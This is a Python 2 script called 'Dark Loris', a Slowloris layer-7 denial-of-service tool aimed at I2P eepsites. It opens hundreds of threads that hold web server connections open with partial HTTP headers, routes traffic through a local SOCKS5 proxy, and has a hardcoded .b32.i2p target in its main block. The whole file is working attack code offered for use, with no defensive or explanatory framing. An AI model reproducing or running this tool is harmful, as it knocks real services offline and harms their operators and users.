# -*- coding: utf-8 -*-
"""
    =======================
        DARK LORIS
    =======================
    SLOW LORIS LAYER 7 DDOS
        ON EEPSITES

    by Christopher Käck
    
"""

import socket, socks, sys, threading
from time import sleep

def attack(**kwargs):
    global HOST
    HOST = kwargs.get('host', 'localhost')
    global PORT 
    PORT = kwargs.get('port', 8000)
    global THREADS 
    THREADS = kwargs.get('threads', 150)
    global DELAY
    DELAY = kwargs.get('delay', 10)
    global REPEAT
    REPEAT = kwargs.get('delay', True)

    global I2P
    I2P = kwargs.get('i2p', False)
    #if I2P:
    #    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1", 4475)
    #    socket.socket = socks.socksocket
    start_attack()

class attack_thread(threading.Thread):
    def run(self):
        self.rep = REPEAT
        down = False
        while self.rep:
            try:
                if I2P:
                    s = socks.socksocket()
                    s.setproxy(socks.PROXY_TYPE_SOCKS5,"127.0.0.1", 4475)
                else:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((HOST, PORT))

                down = False
                s.send('GET /index.html HTTP/1.0\r\n')
                s.send('Host: %s\r\n' % (HOST))
                s.send('User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n')
                s.send('Content-Length: 42\r\n')
                while True:        
                    sleep(DELAY)
                    s.send('X-a: b\r\n')
                
                # send this to shut down connections
                # s.send('\r\n')
                # s.close()
            except Exception:
                if not down:
                    print "TANGO DOWN"
                    down = True

def start_attack():
    threads = []
    for j in range(2): #Send two waves of attack
        for i in xrange(THREADS/2):
            print "Start attack " + str(i)
            t = attack_thread()
            t.daemon = True
            threads.append(t)
            t.start()
        sleep(10) 
    try:
        while True:
            sleep(1)
    except KeyboardInterrupt:
        return

if __name__ == "__main__":
    host = "bns4r3oidnxvxegufjk4i4ahmdribjfzkv5vsnpovnqbwelpawnp.b32.i2p"
    attack(host=host, port=80, threads=200, delay=30, i2p=True)
    
